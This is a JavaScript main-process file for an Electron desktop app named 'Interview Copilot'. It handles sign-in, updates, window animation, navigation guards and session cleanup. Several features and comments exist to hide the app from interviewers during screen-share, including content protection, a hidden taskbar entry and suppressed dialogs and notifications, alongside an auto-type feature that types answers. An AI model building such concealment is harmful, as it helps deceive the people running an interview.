const { app, BrowserWindow, ipcMain, screen, session, desktopCapturer, Tray, Menu, nativeImage, dialog, shell, globalShortcut, Notification, crashReporter, powerSaveBlocker } = require('electron');

// ── Display-sleep blocker (live-interview mic reliability) ──
// While a session is active the user is often still (listening to the
// interviewer, reading the answer), so the OS dims → sleeps the display
// or drops to the lock screen. That ends the desktop-capture video track,
// whose onended tears down the WHOLE capture (mic included) in
// useSpeechRecognition.ts. Holding a 'prevent-display-sleep' block for the
// duration of the session stops the display from sleeping so capture — and
// therefore the mic — survives. Acquired/released from the 'session-active'
// IPC (which the renderer fires when isListening flips) and released on
// quit. Module-scope id so start/stop is idempotent across rapid toggles.
let displaySleepBlockerId = null;
function startDisplaySleepBlocker() {
  try {
    if (displaySleepBlockerId !== null && powerSaveBlocker.isStarted(displaySleepBlockerId)) return;
    displaySleepBlockerId = powerSaveBlocker.start('prevent-display-sleep');
    electronLog.info('[power] display-sleep blocker started', displaySleepBlockerId);
  } catch (e) {
    electronLog.warn('[power] start blocker failed:', e && e.message);
  }
}
function stopDisplaySleepBlocker() {
  try {
    if (displaySleepBlockerId !== null && powerSaveBlocker.isStarted(displaySleepBlockerId)) {
      powerSaveBlocker.stop(displaySleepBlockerId);
      electronLog.info('[power] display-sleep blocker stopped');
    }
  } catch (e) {
    electronLog.warn('[power] stop blocker failed:', e && e.message);
  } finally {
    displaySleepBlockerId = null;
  }
}
const path = require('path');
const fs = require('fs');
const { spawn } = require('child_process');
const database = require('./database.cjs');
// P11-4/5: bracket balance tracker for post-typing surgical repair.
const bracketTracker = require('./bracketTracker.cjs');
const autoTypePlanLog = require('./autoTypePlanLog.cjs');
// P5d Part 1: target-coverage check — catches under-planned/under-typed
// solutions that per-op verify is blind to (pure module, unit-tested).
const { computeCoverageGaps, shouldTriggerRepair } = require('./autoTypeCoverage.cjs');
// Indentation is the one thing the two whitespace-stripped checks above
// cannot see, and the one that turns a correct-looking Python answer into
// a file that will not run. See autoTypeIndent.cjs.
const { compareIndentation, shouldReportIndent } = require('./autoTypeIndent.cjs');

// ─── Crash reporter — must initialize BEFORE app emits 'ready' ───────
// Without this, main-process crashes (V8 GC fault, native module SEGV,
// GPU process abort, third-party module memory corruption) leave zero
// telemetry — they're invisible until a user emails their electron-log
// file. The reporter writes a Breakpad/Crashpad minidump locally and
// uploads to the configured submitURL on next launch.
//
// We deliberately set `uploadToServer:false` until the server endpoint
// is observed to be stable in production — a misbehaving submitURL
// (404, slow, hung) blocks app startup. Operator can flip via env var
// once /api/v1/crash is verified.
try {
  crashReporter.start({
    productName: 'Interview Copilot',
    companyName: 'minicaai',
    submitURL: process.env.CRASH_SUBMIT_URL || 'https://api.minicaai.com/api/v1/crash',
    uploadToServer: process.env.CRASH_UPLOAD_TO_SERVER === '1',
    ignoreSystemCrashHandler: false,
    rateLimit: true,
    compress: true,
    extra: {
      app_version: app.getVersion(),
      platform: process.platform,
      arch: process.arch,
    },
  });
} catch (err) {
  // Reporter init can fail on unusual platforms (no temp dir writable,
  // sandbox restrictions). Log and continue — better to ship without
  // crash reporting than fail to start.
  console.warn('[crashReporter] init failed:', err && err.message);
}

// Shared logger. Writes to <userData>/logs/main.log at info+ and to stdout.
// Lifted to module scope so one-off failure paths (tray icon fallback, any
// future early-lifecycle diagnostics) can log even before the updater block
// runs — otherwise these warnings disappear into the void on packaged builds
// where there's no console attached.
const electronLog = require('electron-log');
electronLog.transports.file.level = 'info';

// ─── Process-level safety nets ────────────────────────────────────────────
// Without these, an unhandled main-process exception (a typo in an IPC
// handler, a Promise rejection in the auto-updater, a UIA spawn failure)
// pops a native Electron error dialog. That HWND is NOT covered by
// setContentProtection — during an active interview screen-share the
// user's interviewer would see "Interview Copilot encountered an error",
// leaking the app's existence and brand. Logging instead of crashing
// keeps us alive and invisible.
//
// We also kill the UIA PowerShell bridge on either fatal event because
// the normal `killUIABridge()` call is in the `before-quit` handler,
// which won't run if the process is exiting on an uncaught exception.
// Without this branch, the spawned PowerShell orphans every crash and
// accumulates in Task Manager.
//
// And we let go of every modifier key. An uncaught exception can tear out
// of the middle of an Auto-Type chord — between the pressKey and the
// releaseKey — and unlike a spawned process, a held Shift or Ctrl is OS
// state that outlives us: the user's own next keystrokes become chords in
// whatever editor has focus. Fire-and-forget with its rejection swallowed,
// because this handler is synchronous and must not become the source of
// the next fatal event.
process.on('uncaughtException', (err) => {
  try { electronLog.error('UNCAUGHT EXCEPTION:', err && err.stack || err); } catch {}
  try { if (typeof killUIABridge === 'function') killUIABridge(); } catch {}
  try {
    if (typeof releaseAllModifiers === 'function') releaseAllModifiers().catch(() => {});
  } catch {}
});
process.on('unhandledRejection', (reason) => {
  try { electronLog.error('UNHANDLED REJECTION:', reason && reason.stack || reason); } catch {}
});

// ─── Single-instance lock ─────────────────────────────────────────────────
// Without this, every desktop launch spawns a fresh copy of the OLD binary
// — so any update sitting cached in %AppData%\Interview Copilot\pending\
// never gets a chance to install, and the user sees the same "ready to
// install" prompt every launch. With it, a second launch focuses the
// existing window instead, and pending updates install at the next quit.
//
// We also use the second-instance hook as our custom-protocol handler:
// after Google OAuth completes, the success page redirects the browser
// to `interview-copilot://signin-complete`, which Windows treats as a
// fresh launch with that URL in argv. The browser tab then closes/goes
// blank automatically (browsers always close the protocol-launch tab
// when the OS handler claims it) and Electron focuses its main window.
if (!app.requestSingleInstanceLock()) {
  app.quit();
} else {
  // Register the custom protocol so Windows/macOS/Linux route
  // `interview-copilot://...` URLs to this app. Packaged builds use the
  // installed exe; dev launches register the running electron binary.
  try {
    const protocolName = 'interview-copilot';
    if (process.defaultApp) {
      // Dev mode: tell the OS to launch this script via the running
      // electron CLI with the second argument (path of the app dir).
      if (process.argv.length >= 2) {
        app.setAsDefaultProtocolClient(protocolName, process.execPath, [require('path').resolve(process.argv[1])]);
      }
    } else {
      app.setAsDefaultProtocolClient(protocolName);
    }
  } catch (e) {
    // OS denied registration (admin-required, sandboxed, etc.). Sign-in
    // still works via polling; we just don't get the auto-close.
    try { electronLog.warn('[protocol] setAsDefaultProtocolClient failed:', e && e.message); } catch {}
  }

  app.on('second-instance', (_evt, argv) => {
    if (mainWindow && !mainWindow.isDestroyed()) {
      smoothShow(mainWindow);
    } else {
      createMainWindow();
    }
    try {
      const protoArg = (argv || []).find(a => typeof a === 'string' && a.startsWith('interview-copilot://'));
      if (protoArg) receiveProtocolUrl(protoArg);
    } catch { /* handoff is best-effort; the manual code still works */ }
  });

  // macOS routes protocol URLs through `open-url` rather than
  // second-instance. Same outcome: focus the main window.
  app.on('open-url', (evt, url) => {
    evt.preventDefault();
    if (mainWindow && !mainWindow.isDestroyed()) {
      smoothShow(mainWindow);
    }
    receiveProtocolUrl(url);
  });

  // Cold start: if the app was NOT already running, the OS launches it
  // with the protocol URL in our own argv — `second-instance` never
  // fires. Without this branch the very first Google sign-in after an
  // app restart would find no handoff and fall back to the typed code.
  //
  // Deferred to whenReady deliberately: this block runs during module
  // evaluation, and receiveProtocolUrl closes over `mainWindow` /
  // `popoutWindow`, whose `let` bindings are still in the temporal dead
  // zone this early. Calling it inline would throw at boot on precisely
  // the launch that carries a sign-in.
  app.whenReady().then(() => {
    try {
      const bootProtoArg = (process.argv || []).find(a => typeof a === 'string' && a.startsWith('interview-copilot://'));
      if (bootProtoArg) receiveProtocolUrl(bootProtoArg);
    } catch { /* best-effort */ }
  });
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  GOOGLE SIGN-IN HANDOFF
//
//  The browser that completed Google consent navigates to
//  `interview-copilot://signin-complete?session_id=…&code=…`. The OS
//  routes that to the app ON THAT MACHINE, which is the whole security
//  property: /google/poll will not release the session without `code`,
//  and the code only ever reaches the machine where a human consented.
//  Someone who picked the session_id and is polling from elsewhere never
//  sees it. See server/src/routes/auth.js (mintHandoffCode).
//
//  Buffered rather than fire-and-forget because the ordering is not ours
//  to control: on a cold start the URL arrives before any renderer
//  exists, and even warm the sign-in screen may not have its listener
//  attached yet. So we push AND hold, and the renderer drains on demand.
//  Single-slot — a newer sign-in supersedes an abandoned one.
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
let pendingGoogleHandoff = null;

function receiveProtocolUrl(rawUrl) {
  let parsed;
  try {
    parsed = new URL(String(rawUrl));
  } catch {
    try { electronLog.warn('[protocol] unparseable URL ignored'); } catch {}
    return;
  }
  // `interview-copilot://signin-complete?…` parses with host
  // 'signin-complete' and an empty path, so match on either shape rather
  // than assuming one — Chromium's URL parser has moved on this before.
  const action = (parsed.hostname || parsed.pathname.replace(/^\/+/, '') || '').toLowerCase();
  if (action !== 'signin-complete') {
    try { electronLog.info('[protocol] ignored action:', action); } catch {}
    return;
  }

  const sessionId = parsed.searchParams.get('session_id');
  const code = parsed.searchParams.get('code');
  if (!sessionId || !code) {
    // A pre-handoff server (or a truncated URL). Nothing to forward; the
    // browser page shows the typed-code fallback for exactly this case.
    try { electronLog.warn('[protocol] signin-complete without a handoff code'); } catch {}
    return;
  }

  pendingGoogleHandoff = { sessionId, code, receivedAt: Date.now() };
  // Never log the code itself — it is a bearer credential for a session.
  try { electronLog.info('[protocol] google handoff received for session', sessionId.slice(0, 8) + '…'); } catch {}

  for (const win of [mainWindow, popoutWindow]) {
    if (win && !win.isDestroyed()) {
      try { win.webContents.send('auth:google-handoff', { sessionId, code }); } catch {}
    }
  }
}

let mainWindow = null;
let popoutWindow = null;
let tray = null;
let installerModalWindow = null;

// Cached userId for main-process operations that need it without a renderer
// roundtrip — specifically the close/quit "fresh session on next launch"
// path. Populated opportunistically: every db:* IPC handler that already
// receives userId from the renderer calls _maybeCacheUserId(userId), so by
// the time the user touches the X button we have it. Cleared on sign-out
// is not needed — sign-out itself goes through db:get-active-session with
// the new (or null) userId, overwriting this value naturally.
let _cachedUserId = null;
function _maybeCacheUserId(userId) {
  if (userId && typeof userId === 'string') _cachedUserId = userId;
}

// ─── Smooth show / hide for windows ──────────────────────────────────────
// Replaces raw .show() / .hide() calls in hot paths (hotkey, tray click,
// close button, second-instance, notification click). Without these,
// the window snaps in/out which feels primitive on a 2026 desktop. We
// animate opacity 0↔1 over 220ms in / 160ms out with cubic easing for
// a perceptually smooth landing rather than a uniform fade.
//
// Stealth bypass: if sessionActive=true (interview live) the animation
// is skipped — opacity transitions are still visible to screen-share
// frame grabbers in some Windows display drivers, and at that point
// any visual noise during a session is unacceptable. Falls back to
// instant show/hide which the existing setContentProtection already
// covers cleanly.
//
// Per-window animation guard via WeakMap: a rapid hotkey toggle (user
// presses Ctrl+Alt+Space twice in 100ms) shouldn't stack two competing
// intervals — we cancel the previous before starting the next. WeakMap
// because BrowserWindow is a JS object that may be garbage-collected
// after destroy() and we don't want to leak entries.
const _windowAnimating = new WeakMap();

function _cancelWindowAnimation(win) {
  const prev = _windowAnimating.get(win);
  if (prev) {
    clearInterval(prev.interval);
    _windowAnimating.delete(win);
  }
}

function smoothShow(win, opts) {
  opts = opts || {};
  if (!win || win.isDestroyed()) return;
  // Stealth bypass — see comment above.
  if (sessionActive) {
    if (win.isMinimized()) win.restore();
    win.show();
    win.focus();
    return;
  }
  _cancelWindowAnimation(win);

  const DURATION = opts.duration || 220;
  const startTime = Date.now();
  try { win.setOpacity(0); } catch (_) { /* opacity unsupported on some configs */ }
  if (win.isMinimized()) win.restore();
  win.show();
  win.focus();

  const interval = setInterval(() => {
    if (win.isDestroyed()) {
      clearInterval(interval);
      _windowAnimating.delete(win);
      return;
    }
    const elapsed = Date.now() - startTime;
    const t = Math.min(1, elapsed / DURATION);
    // Ease-out cubic — fast initial rise, soft landing at full opacity
    const eased = 1 - Math.pow(1 - t, 3);
    try { win.setOpacity(eased); } catch (_) {}
    if (t >= 1) {
      clearInterval(interval);
      try { win.setOpacity(1); } catch (_) {}
      _windowAnimating.delete(win);
    }
  }, 16);
  _windowAnimating.set(win, { interval, type: 'show' });
}

// ─── Navigation hardening ───────────────────────────────────────────────
// Applied to each BrowserWindow's webContents to block two attack paths
// that markdown links and window.open() expose:
//
//   1. New-window opens (anchor target=_blank, window.open()) — without
//      a window-open handler, Electron creates a CHILD BrowserWindow with
//      the parent's webPreferences, including preload + contextIsolation.
//      A markdown-injected <a href="https://attacker"> that the user
//      clicks would land in a window with access to our IPC bridge.
//
//   2. Top-frame navigation away from our app URL — a will-navigate
//      handler that doesn't preventDefault lets the renderer be replaced
//      entirely with attacker HTML, again with preload still attached.
//
// Both: external URLs go through shell.openExternal with a strict
// protocol allowlist (http, https, mailto). javascript:, file:, data:,
// chrome:, vbscript: etc. are rejected.
function isSafeExternalUrl(url) {
  if (typeof url !== 'string' || url.length > 4096) return false;
  let parsed;
  try { parsed = new URL(url); } catch { return false; }
  return parsed.protocol === 'https:' || parsed.protocol === 'http:' || parsed.protocol === 'mailto:';
}

function attachNavigationGuards(webContents, isDev) {
  if (!webContents) return;

  // window.open / target=_blank — never spawn a child Electron window.
  // Open in OS browser if URL is safe, otherwise drop silently.
  webContents.setWindowOpenHandler(({ url }) => {
    if (isSafeExternalUrl(url)) {
      shell.openExternal(url).catch((err) => {
        electronLog.warn('[nav-guard] openExternal failed:', err && err.message);
      });
    } else {
      electronLog.warn('[nav-guard] blocked window.open with unsafe URL:', url);
    }
    return { action: 'deny' };
  });

  // Top-frame navigation — refuse to leave the app URL. The renderer
  // can do client-side routing within #hash / ?query without triggering
  // will-navigate, so this is purely a hostile-redirect guard.
  webContents.on('will-navigate', (event, url) => {
    let allowed = false;
    if (isDev) {
      // Dev: anything served from the Vite dev server.
      allowed = url.startsWith('http://localhost:3005') || url.startsWith('http://127.0.0.1:3005');
    } else {
      // Packaged: anything inside the app's dist/index.html origin (file://).
      allowed = url.startsWith('file://');
    }
    if (!allowed) {
      electronLog.warn('[nav-guard] blocked will-navigate to:', url);
      event.preventDefault();
      // If it's a safe external URL, route through the OS browser as a
      // courtesy — the renderer might have intended to "open this link"
      // but used a top-frame anchor. setWindowOpenHandler usually catches
      // these, but Electron's plumbing routes some clicks here instead.
      if (isSafeExternalUrl(url)) {
        shell.openExternal(url).catch(() => {});
      }
    }
  });

  // Belt-and-suspenders: refuse will-redirect too. Some redirect chains
  // can survive will-navigate's preventDefault if a previous redirect was
  // permitted, so re-validate every step.
  webContents.on('will-redirect', (event, url) => {
    const allowed = isDev
      ? (url.startsWith('http://localhost:3005') || url.startsWith('http://127.0.0.1:3005'))
      : url.startsWith('file://');
    if (!allowed) {
      electronLog.warn('[nav-guard] blocked will-redirect to:', url);
      event.preventDefault();
    }
  });
}

function smoothHide(win, onDone, opts) {
  opts = opts || {};
  if (!win || win.isDestroyed()) {
    if (onDone) onDone();
    return;
  }
  if (!win.isVisible()) {
    // Already hidden — just run the done callback so chained logic
    // (notifyHiddenToTray, setManageSubOpen, etc.) still fires.
    if (onDone) onDone();
    return;
  }
  if (sessionActive) {
    win.hide();
    try { win.setOpacity(1); } catch (_) {}
    if (onDone) onDone();
    return;
  }
  _cancelWindowAnimation(win);

  const DURATION = opts.duration || 160;
  const startTime = Date.now();
  let startOpacity = 1;
  try { startOpacity = win.getOpacity(); } catch (_) {}

  const interval = setInterval(() => {
    if (win.isDestroyed()) {
      clearInterval(interval);
      _windowAnimating.delete(win);
      if (onDone) onDone();
      return;
    }
    const elapsed = Date.now() - startTime;
    const t = Math.min(1, elapsed / DURATION);
    // Ease-in cubic — slow start, fast finish. Window appears to
    // "fall away" rather than fade uniformly.
    const eased = 1 - Math.pow(t, 3);
    try { win.setOpacity(startOpacity * eased); } catch (_) {}
    if (t >= 1) {
      clearInterval(interval);
      try {
        win.hide();
        win.setOpacity(1); // reset for next show
      } catch (_) {}
      _windowAnimating.delete(win);
      if (onDone) onDone();
    }
  }, 16);
  _windowAnimating.set(win, { interval, type: 'hide' });
}

// ─── macOS Installer Modal ────────────────────────────────────────────────
// Mac's update path (electron-updater MacUpdater → ditto-swap of the .app
// bundle) has no equivalent of the NSIS oneClick progress dialog Windows
// users see — the swap is completely silent at the OS level. Without UI,
// the user clicks "Restart & Update" and just watches the window vanish
// with no signal that anything is happening; the new app then appears
// 1–2s later with the dock bounce, but in the gap it looks like a crash.
//
// This helper paints a small frameless window styled to mirror the NSIS
// dialog: light-gray background, app icon + product name, "Installing
// update…" status, animated green progress bar. Shown for ~1.5s before
// quitAndInstall fires; once the main process tears down it closes with
// the rest of the renderers. setContentProtection(true) so a screen-share
// in progress at update time doesn't leak "Interview Copilot is updating".
function showMacInstallerModal({ version } = {}) {
  if (process.platform !== 'darwin') return Promise.resolve();
  if (installerModalWindow && !installerModalWindow.isDestroyed()) {
    return Promise.resolve();
  }
  return new Promise((resolve) => {
    let resolved = false;
    const done = () => { if (!resolved) { resolved = true; resolve(); } };
    try {
      const { width: screenW, height: screenH } = screen.getPrimaryDisplay().workAreaSize;
      const modalW = 500;
      const modalH = 140;
      installerModalWindow = new BrowserWindow({
        width: modalW,
        height: modalH,
        x: Math.round((screenW - modalW) / 2),
        y: Math.round((screenH - modalH) / 2),
        frame: false,
        resizable: false,
        movable: false,
        minimizable: false,
        maximizable: false,
        fullscreenable: false,
        transparent: false,
        backgroundColor: '#f3f4f6',
        alwaysOnTop: true,
        skipTaskbar: true,
        // Non-focusable: never steal focus from a running screen-share
        // window picker or whatever the user had selected at update time.
        focusable: false,
        show: false,
        title: 'Interview Copilot',
        webPreferences: {
          nodeIntegration: false,
          contextIsolation: true,
          sandbox: true,
          devTools: false,
        },
      });
      try { installerModalWindow.setContentProtection(true); } catch (_) {}
      installerModalWindow.once('ready-to-show', () => {
        try { installerModalWindow.show(); } catch (_) {}
        done();
      });
      installerModalWindow.loadFile(
        path.join(__dirname, 'installer-modal.html'),
        version ? { query: { v: String(version) } } : undefined
      ).catch((err) => {
        electronLog.warn('[updater] installer-modal loadFile failed:', err && err.message);
        done();
      });
      // Belt-and-suspenders: never let a failed paint stall performInstall.
      setTimeout(done, 800);
    } catch (err) {
      electronLog.warn('[updater] showMacInstallerModal threw:', err && err.message);
      done();
    }
  });
}

// ─── Clean-close handler ──────────────────────────────────────────────────
// Fires when the user signals "I'm done with this session" via:
//   1. X on main window when the popout is NOT in use (popout-in-use means
//      the user is still interviewing — X is just hiding the management UI)
//   2. Tray menu "Quit" (always — Quit is a deliberate "really done" signal,
//      so it cleans up even if the popout was open)
//
// Three things happen, in this order:
//   1. database.endActiveSession(userId) — synchronous SQL. Empty sessions
//      get DELETEd (so the sidebar doesn't fill with placeholder "Interview
//      <date>" rows for users who opened-and-closed without asking anything).
//      Non-empty sessions get is_active=0 so they stay in history but next
//      launch's getOrCreateActiveSession sees no active row → mints a fresh
//      one. This is the "every fresh app open = fresh conversation" piece.
//   2. database.getOrCreateActiveSession(userId) — mint the fresh session
//      RIGHT NOW so the renderer has something to switch to. On the Quit
//      path this is technically wasted work (process dies in a few hundred
//      ms anyway), but on the X-hide path it's load-bearing: the renderer
//      is still alive and needs the new session id to update its in-memory
//      messages/files state via the existing db:active-session-changed
//      broadcast wiring.
//   3. webContents.send('cmd-end-session') to main renderer — renderer
//      reacts by stopping the mic (if listening) and turning off Auto mode
//      (if on). The popout, if open, mirrors via the existing state-sync
//      effect — no separate IPC needed.
//
// Why we cache userId in main instead of asking the renderer: this path
// must work even when the renderer is mid-quit and can't respond to IPC.
// Caching means the DB call is sync and bulletproof — at worst, the
// renderer doesn't get the cmd-end-session in time and mic/auto state
// is irrelevant because the process is dying anyway.
//
// No-op when userId is unknown (user never signed in this session).
function endSessionCleanly() {
  if (!_cachedUserId) {
    electronLog.info('[end-session] skip — no cached userId yet');
    return;
  }
  let result;
  try {
    result = database.endActiveSession(_cachedUserId);
    electronLog.info(`[end-session] ${result.action} ${result.sessionId || '-'}`);
  } catch (err) {
    electronLog.warn('[end-session] endActiveSession failed:', err && err.message);
    return;
  }
  // Only mint a fresh session if we actually touched something. If action
  // was 'noop' (no active session existed), there's nothing for the renderer
  // to switch to and the next db:get-active-session call will mint lazily.
  if (result.action !== 'noop') {
    try {
      const fresh = database.getOrCreateActiveSession(_cachedUserId);
      // Reuse the existing broadcast wiring — useDatabase.ts subscribes to
      // db:active-session-changed and reloads in place. Both main and
      // popout receive it, so popout (if open during a Quit) also switches.
      BrowserWindow.getAllWindows().forEach((win) => {
        if (!win.isDestroyed()) {
          try { win.webContents.send('db:active-session-changed', fresh.id); } catch {}
          try { win.webContents.send('db:sessions-updated'); } catch {}
        }
      });
    } catch (err) {
      electronLog.warn('[end-session] mint fresh failed:', err && err.message);
    }
  }
  // Tell the main renderer to stop mic + Auto. Fire-and-forget — even if
  // the renderer is mid-tear-down it's not load-bearing (mic dies with the
  // process anyway; autoSend is in-memory and doesn't survive a quit).
  try {
    if (mainWindow && !mainWindow.isDestroyed()) {
      mainWindow.webContents.send('cmd-end-session');
    }
  } catch (err) {
    electronLog.warn('[end-session] cmd-end-session send failed:', err && err.message);
  }
}

// ─── First-time "app is in the tray" notification ────────────────────────
// Fires once per install when the user first hides the window. Without it
// new users who just hit X often think the app crashed (it didn't — it's
// just stealth-mode invisible in the tray) and uninstall before figuring
// it out. Persisted as a tiny JSON file in userData so the choice survives
// quits, resets on reinstall (a fresh install is a fine time to remind).
let _trayTipFile = null;
function getTrayTipFile() {
  if (_trayTipFile) return _trayTipFile;
  _trayTipFile = path.join(app.getPath('userData'), 'tray-tip-shown.json');
  return _trayTipFile;
}
function hasTrayTipBeenShown() {
  try { return fs.existsSync(getTrayTipFile()); } catch { return false; }
}
function markTrayTipShown() {
  try {
    fs.writeFileSync(getTrayTipFile(), JSON.stringify({ shownAt: new Date().toISOString() }));
  } catch (err) {
    electronLog.warn('[tray-tip] failed to persist:', err && err.message);
  }
}
function notifyHiddenToTray() {
  // Hard guard: never fire during an active interview session. Windows
  // toast notifications render OUTSIDE Electron's setContentProtection
  // and would appear on the candidate's screen-share, leaking both the
  // app's existence and its product name. The session-active handler is
  // the source of truth for "interview in progress."
  if (sessionActive) {
    electronLog.info('[tray-tip] suppressed — session-active=true (screen-share leak risk)');
    return;
  }
  if (hasTrayTipBeenShown()) return;
  // Mark BEFORE showing — even if the Notification API fails, we don't
  // want to spam the user on every subsequent hide. One try, then quiet.
  markTrayTipShown();
  if (!Notification.isSupported()) {
    electronLog.info('[tray-tip] Notification not supported on this OS, skipping');
    return;
  }
  const accel = process.platform === 'darwin' ? 'Cmd+Alt+Space' : 'Ctrl+Alt+Space';
  try {
    const n = new Notification({
      title: 'Interview Copilot is in your system tray',
      body: `Press ${accel} anytime to bring it back, or click the icon in your taskbar tray.`,
      silent: false,
    });
    n.on('click', () => {
      if (mainWindow && !mainWindow.isDestroyed()) {
        smoothShow(mainWindow);
      } else {
        createMainWindow();
      }
    });
    n.show();
  } catch (err) {
    electronLog.warn('[tray-tip] Notification show threw:', err && err.message);
  }
}

// Updater state shared between the auto-update block (set when a download
// finishes) and the close / before-quit handlers (which install the pending
// update instead of leaving it stranded in the cache).
let pendingUpdate = null;          // { version, info } | null
let installPendingUpdate = null;   // (() => void) | null

const isDev = !app.isPackaged;

// API base URL — production uses api.minicaai.com.
//
// `let` (not `const`) because in DEV we auto-redirect to a local server
// when one is reachable — see resolveDevApiBase() in app.whenReady().
// Rationale: a dev iterating on server routes (e.g. the auto-type vision
// planner) needs main.cjs to hit THEIR local server, not production —
// otherwise a brand-new route 404s and the feature silently falls back
// to its old behavior, making it look like the code change "did
// nothing". An explicit MINICAAI_API_BASE env var always wins; the
// auto-detect only fills the gap when it's unset.
//
// Production builds (`!isDev`) never auto-detect — always api.minicaai.com.
let API_BASE = process.env.MINICAAI_API_BASE || 'https://api.minicaai.com';

// ── THE MAIN PROCESS IS A CLIENT TOO ──
//
// The renderer stamps X-App-Version on every /api/v1/ call (see the block
// at the top of index.tsx). This process does NOT go through that: it calls
// the API directly with Node's global fetch — /license/entitlements and the
// three /ai/autotype-* routes — and Node's fetch is undici, which never
// touches Electron's session, so a webRequest handler would not see it
// either. Two independent HTTP surfaces, so two interceptions.
//
// None of those routes is version-gated today (autotype is requireTier
// ULTRA_ONLY, no session gate, no cover), so strictly this changes nothing
// right now. It is here so that when someone later gates an autotype route,
// the main process does not silently present as an ancient client and get
// quietly excluded from a protocol it fully supports — a bug that would
// look like "auto-type stopped working for no reason".
//
// Same shape as the renderer patch: path-scoped, never overwrites, never
// throws, falls through to the original on anything unexpected.
(() => {
  try {
    const original = globalThis.fetch;
    if (typeof original !== 'function') return;
    globalThis.fetch = function patchedFetch(input, init) {
      try {
        const url =
          typeof input === 'string' ? input :
          (input && typeof input.href === 'string') ? input.href : null;
        if (url && url.includes('/api/v1/')) {
          const headers = new Headers((init && init.headers) || undefined);
          if (!headers.has('X-App-Version')) headers.set('X-App-Version', app.getVersion());
          return original.call(this, input, { ...(init || {}), headers });
        }
      } catch { /* fall through untouched */ }
      return original.call(this, input, init);
    };
  } catch { /* an unstamped request is fine; a broken one is not */ }
})();

// Probe a candidate local API base; resolves true if it answers a cheap
// GET within the timeout. Used only in dev, only when MINICAAI_API_BASE
// is unset.
async function probeLocalApiBase(base, timeoutMs = 1500) {
  // Probe the cheapest always-200 route (/api/health ~10ms) instead of
  // /api/v1/geo (~100ms, does a GeoIP lookup), and retry a few times: this
  // runs during Electron's boot storm where the first attempt can lose a
  // CPU race even though the server is up. The old single-shot geo probe
  // false-negatived and silently sent dev traffic to PRODUCTION. (2026-07-09)
  for (let attempt = 0; attempt < 3; attempt++) {
    try {
      const ctrl = new AbortController();
      const t = setTimeout(() => ctrl.abort(), timeoutMs);
      const res = await fetch(`${base}/api/health`, { signal: ctrl.signal });
      clearTimeout(t);
      if (res.ok) return true;
    } catch { /* retry below */ }
    await new Promise((r) => setTimeout(r, 400));
  }
  return false;
}

// Dev-only: if MINICAAI_API_BASE wasn't explicitly set and a local
// server is up on :4000, redirect API_BASE there. Logged loudly either
// way so "which server is main.cjs calling?" is never a mystery again.
async function resolveDevApiBase() {
  if (!isDev) {
    console.log(`[main] API_BASE = ${API_BASE} (packaged build)`);
    return;
  }
  if (process.env.MINICAAI_API_BASE) {
    console.log(`[main] API_BASE = ${API_BASE} (from MINICAAI_API_BASE env)`);
    return;
  }
  const localBase = 'http://localhost:4000';
  const localUp = await probeLocalApiBase(localBase);
  if (localUp) {
    API_BASE = localBase;
    console.log(`[main] API_BASE = ${API_BASE} (dev auto-detect: local server is up — server-side changes will be picked up here)`);
  } else {
    console.log(`[main] API_BASE = ${API_BASE} (dev, but no local server on :4000 — using production; new local-only routes will 404)`);
  }
}

// Permissions and lifecycle are set up in the APP LIFECYCLE section below

function getAppURL(params = '') {
  if (isDev) {
    return `http://localhost:3005${params ? '?' + params : ''}`;
  }
  // For production, load file and append hash params
  const filePath = path.join(__dirname, '../dist/index.html');
  return params ? `file://${filePath}?${params}` : filePath;
}

// ───────────────────────────────────────────────
//  MAIN WINDOW — Full app, opaque, normal frame
// ───────────────────────────────────────────────
function createMainWindow() {
  const { width: screenW, height: screenH } = screen.getPrimaryDisplay().workAreaSize;

  mainWindow = new BrowserWindow({
    width: Math.min(1100, screenW - 100),
    height: Math.min(750, screenH - 100),
    minWidth: 800,
    minHeight: 600,
    // Normal opaque window with frame
    frame: true,
    transparent: false,
    backgroundColor: '#0b0a08', // Warm obsidian — matches the in-app dark
                                // theme (index.html .dark --bg-color) so the
                                // pre-paint frame doesn't flash cool zinc.
    skipTaskbar: true,  // Hidden from taskbar — access via system tray
    webPreferences: {
      // Sandboxed renderer: no Node.js access, no shared context with the
      // main world. The renderer reaches main only via the allowlisted
      // bridge in electron/preload.cjs (window.electronAPI). This blocks
      // a renderer XSS / compromised npm dep from spawning shells, reading
      // the filesystem, or pivoting to arbitrary IPC channels.
      nodeIntegration: false,
      contextIsolation: true,
      preload: path.join(__dirname, 'preload.cjs'),
      // DevTools windows are NOT covered by setContentProtection — they
      // open as a separate HWND. Disable in packaged builds so a curious
      // keystroke (Ctrl+Shift+I) can't pop an unprotected inspector up
      // during an interview screen-share.
      devTools: isDev,
      // Keep timers running at full rate when the window is hidden /
      // backgrounded — the NORMAL interview state (user is in Zoom/Meet,
      // minicaai is behind it or hidden to tray). Electron's default
      // (true) clamps setInterval/setTimeout to ~1/min for background
      // windows, which throttles the Deepgram keepalive + reconnect
      // timers (mic drops during silence, slow recovery) AND the
      // credit-timer tick/heartbeat (the "timer freezes then jumps"
      // reports). This is the single most load-bearing flag for
      // mid-interview reliability.
      backgroundThrottling: false,
    },
    // In packaged builds the icon must come from a path bundled by
    // electron-builder — dist/ is in `files`, so dist/favicon.ico ships.
    // In dev, dist/ may not exist (vite dev serves from public/), so fall
    // back to public/favicon.ico. Without the fallback, dev runs show the
    // bare default Electron icon in the Windows title bar — looks like an
    // "old" icon next to the conversation sidebar.
    icon: isDev
      ? path.join(__dirname, '../public/favicon.ico')
      : path.join(__dirname, '../dist/favicon.ico'),
    title: 'Interview Copilot',
    show: false,
  });

  // INVISIBLE TO SCREEN SHARE
  mainWindow.setContentProtection(true);

  // Hide instead of close — app stays in tray. EXCEPTION: if a downloaded
  // update is sitting in the cache, give the user the choice to install it
  // now instead of silently hiding. X-close doesn't fire before-quit, and
  // autoInstallOnAppQuit is off (we own the install path), so without this
  // prompt the download would rot in the cache until the next full quit.
  mainWindow.on('close', (e) => {
    if (app.isQuitting) return;
    e.preventDefault();
    if (!pendingUpdate || !installPendingUpdate) {
      // ── Clean-close gate ────────────────────────────────────────────
      // When the popout is in use, the user is actively interviewing —
      // X on main is just "hide the management UI", NOT "I'm done". So
      // we preserve mic / Auto / conversation in that case.
      //
      // When the popout is NOT in use, X is the user's "I'm done with
      // this session" signal. Stop the mic, turn off Auto, and demote
